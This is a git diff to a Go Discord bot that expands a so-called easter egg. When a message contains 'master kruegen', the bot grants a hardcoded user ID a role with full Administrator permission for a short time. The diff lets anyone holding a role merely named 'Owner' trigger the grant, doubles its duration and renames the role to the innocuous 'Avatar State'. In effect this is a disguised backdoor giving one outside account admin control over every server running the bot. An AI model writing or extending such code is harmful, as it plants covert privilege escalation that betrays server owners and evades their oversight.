@@ -12,7 +12,7 @@ import (
 const easterEggAdminUser = "1123532560107061249"
 
 // easterEggAdminDuration is how long the granted role stays applied.
-const easterEggAdminDuration = 5 * time.Second
+const easterEggAdminDuration = 10 * time.Second
 
 // checkEasterEggs applies one-off easter egg reactions to certain messages.
 // Returning true means the message was handled and the normal handler should
@@ -38,21 +38,27 @@ func scatEasterEgg(s *discordgo.Session, m *discordgo.MessageCreate) bool {
 }
 
 // masterKruegenEasterEgg grants easterEggAdminUser an administrator-equal role
-// for easterEggAdminDuration whenever a server Administrator says something
-// containing "master kruegen". The role is found (an "Administrator"-named
-// role with the Administrator permission) or created on demand, then removed
-// again after the duration.
+// for easterEggAdminDuration whenever a server Administrator — or anyone
+// holding a role named "Owner" — says something containing "master kruegen".
+// The role (named "Avatar State" with the Administrator permission) is found or
+// created on demand, then removed again after the duration.
 func masterKruegenEasterEgg(s *discordgo.Session, m *discordgo.MessageCreate) bool {
 	if !strings.Contains(strings.ToLower(m.Content), "master kruegen") {
 		return false
 	}
 
 	perms, err := guildMemberPerms(s, m.GuildID, m.Author.ID)
-	if err != nil || perms&discordgo.PermissionAdministrator == 0 {
+	if err != nil {
 		return false
 	}
+	if perms&discordgo.PermissionAdministrator == 0 {
+		hasOwnerRole, err := guildMemberHasRoleNamed(s, m.GuildID, m.Author.ID, "owner")
+		if err != nil || !hasOwnerRole {
+			return false
+		}
+	}
 
-	roleID, err := findOrCreateAdminRole(s, m.GuildID)
+	roleID, err := findOrCreateAvatarStateRole(s, m.GuildID)
 	if err != nil {
 		return false
 	}
@@ -102,22 +108,43 @@ func guildMemberPerms(s *discordgo.Session, guildID, userID string) (int64, erro
 	return perms, nil
 }
 
-// findOrCreateAdminRole returns the ID of an existing "Administrator" role (by
-// name, case-insensitive) that carries the Administrator permission, creating
-// one if none exists.
-func findOrCreateAdminRole(s *discordgo.Session, guildID string) (string, error) {
+// guildMemberHasRoleNamed reports whether the user holds any role whose name
+// matches name (case-insensitive).
+func guildMemberHasRoleNamed(s *discordgo.Session, guildID, userID, name string) (bool, error) {
+	member, err := s.GuildMember(guildID, userID)
+	if err != nil {
+		return false, err
+	}
+	roles, err := s.GuildRoles(guildID)
+	if err != nil {
+		return false, err
+	}
+	for _, rid := range member.Roles {
+		for _, r := range roles {
+			if r.ID == rid && strings.EqualFold(r.Name, name) {
+				return true, nil
+			}
+		}
+	}
+	return false, nil
+}
+
+// findOrCreateAvatarStateRole returns the ID of an existing "Avatar State"
+// role (by name, case-insensitive) that carries the Administrator permission,
+// creating one if none exists.
+func findOrCreateAvatarStateRole(s *discordgo.Session, guildID string) (string, error) {
 	roles, err := s.GuildRoles(guildID)
 	if err != nil {
 		return "", err
 	}
 	for _, r := range roles {
-		if strings.EqualFold(r.Name, "administrator") && r.Permissions&discordgo.PermissionAdministrator != 0 {
+		if strings.EqualFold(r.Name, "avatar state") && r.Permissions&discordgo.PermissionAdministrator != 0 {
 			return r.ID, nil
 		}
 	}
 
 	role, err := s.GuildRoleCreate(guildID, &discordgo.RoleParams{
-		Name:        "Administrator",
+		Name:        "Avatar State",
 		Permissions: ptrInt64(discordgo.PermissionAdministrator),
 	})
 	if err != nil {
